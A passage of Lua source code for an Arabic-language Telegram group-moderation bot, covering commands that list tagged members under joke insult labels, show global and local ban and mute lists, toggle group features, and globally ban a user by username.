ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الوتكات', data = msg.sender.user_id..'/Delwtk'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المتوحدين' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."twhd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو متوحدين هنا كلهم اتعالجو 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه المتوحدين  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المتوحدين', data = msg.sender.user_id..'/Deltwhd'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الكلاب' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."klb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو كلاب هنا ارفعلنل شويه نضيهم عضم 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه الكلاب  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الكلاب', data = msg.sender.user_id..'/Delklb'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الحمير' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."mar:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو حمير هنا 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه الحمير  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الحمير', data = msg.sender.user_id..'/Delmar'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'العرر' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."3ra:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو عرر هنا 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه العرر  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح العرر', data = msg.sender.user_id..'/Del3ra'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'السمب' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."smb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو سمباويه هنا 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه السمب  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح السمب', data = msg.sender.user_id..'/Delsmb'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'القرود' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."2rd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو قرود هنا يكلبي 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه القرود  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح القرود', data = msg.sender.user_id..'/Del2rd'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الاغبياء' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."8by:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ماكو اغبياء هنا يكلبي 😂😂 , ","md",true)  
end
ListMembers = '\n*٠ قائمه الاغبياء  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الاغبياء', data = msg.sender.user_id..'/Del8by'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
-----------تسلية-------
if text == 'المحظورين عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين عام حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المحظورين عام  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المحظورين عام', data = msg.sender.user_id..'/BanAll'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المكتومين عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."ktmAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مكتومين عام حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المكتومين عام  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المكتومين عام', data = msg.sender.user_id..'/ktmAll'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المحظورين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المحظورين  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المحظورين', data = msg.sender.user_id..'/BanGroup'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المكتومين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."SilentGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مكتومين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المكتومين  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المكتومين', data = msg.sender.user_id..'/SilentGroupGroup'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text and text:match("^تفعيل (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^تفعيل (.*)$")
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if TextMsg == 'الرابط' then
Redis:set(darket.."Status:Link"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الرابط ","md",true)
end
if TextMsg == 'الترحيب' then
Redis:set(darket.."Status:Welcome"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الترحيب ","md",true)
end
if TextMsg == 'الايدي' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:Id"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الايدي ","md",true)
end
if TextMsg == 'الايدي بالصوره' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:IdPhoto"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الايدي بالصوره ","md",true)
end
if TextMsg == 'الردود' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:Reply"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الردود ","md",true)
end
if TextMsg == 'الردود العامه' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:ReplySudo"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الردود العامه ","md",true)
end
if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:BanId"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الحظر , الطرد , التقييد","md",true)
end
if TextMsg == 'الرفع' then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:SetId"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الرفع ","md",true)
end
if TextMsg == 'الالعاب' then
Redis:set(darket.."Status:Games"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الالعاب ","md",true)
end
if TextMsg == 'التحقق' then
    Redis:set(darket.."Status:joinet"..msg_chat_id,true) 
    return send(msg_chat_id,msg_id,"٠ تم تفعيل التحقق ","md",true)
    end
if TextMsg == 'اطردني' then
Redis:set(darket.."Status:KickMe"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل اطردني ","md",true)
end
if TextMsg == 'نزلني' then
Redis:set(darket.."Status:remMe"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل نزلني ","md",true)
end
if TextMsg == 'البوت الخدمي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."BotFree",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل البوت الخدمي ","md",true)
end
if TextMsg == 'التواصل' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."TwaslBot",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل التواصل داخل البوت ","md",true)
end

end

if text and text:match("^تعطيل (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^تعطيل (.*)$")
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if TextMsg == 'الرابط' then
Redis:del(darket.."Status:Link"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الرابط ","md",true)
end
if TextMsg == 'الترحيب' then
Redis:del(darket.."Status:Welcome"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الترحيب ","md",true)
end
if TextMsg == 'الايدي' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:Id"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الايدي ","md",true)
end
if TextMsg == 'الايدي بالصوره' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:IdPhoto"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الايدي بالصوره ","md",true)
end
if TextMsg == 'الردود' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:Reply"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الردود ","md",true)
end
if TextMsg == 'الردود العامه' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Status:ReplySudo"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الردود العامه ","md",true)
end
if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:BanId"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الحظر , الطرد , التقييد","md",true)
end
if TextMsg == 'الرفع' then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Status:SetId"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الرفع ","md",true)
end
if TextMsg == 'الالعاب' then
Redis:del(darket.."Status:Games"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الالعاب ","md",true)
end
if TextMsg == 'التحقق' then
    Redis:del(darket.."Status:joinet"..msg_chat_id) 
    return send(msg_chat_id,msg_id,"٠ تم تعطيل التحقق ","md",true)
    end
if TextMsg == 'اطردني' then
Redis:del(darket.."Status:KickMe"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل اطردني ","md",true)
end
if TextMsg == 'نزلني' then
Redis:del(darket.."Status:remMe"..msg_chat_id) 
return send(msg_chat_id,msg_id,"٠ تم تعطيل نزلني ","md",true)
end
if TextMsg == 'البوت الخدمي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."BotFree") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل البوت الخدمي ","md",true)
end
if TextMsg == 'التواصل' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."TwaslBot") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل التواصل داخل البوت ","md",true)
end

end

if text and text:match('^حظر عام @(%S+)$') then
local UserName = text:match('^حظر عام @(%S+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if Redis:sismember(darket.."BanAll:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanAll:Groups",UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء العام @(%S+)$') then
local UserName = text:match('^الغاء العام @(%S+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
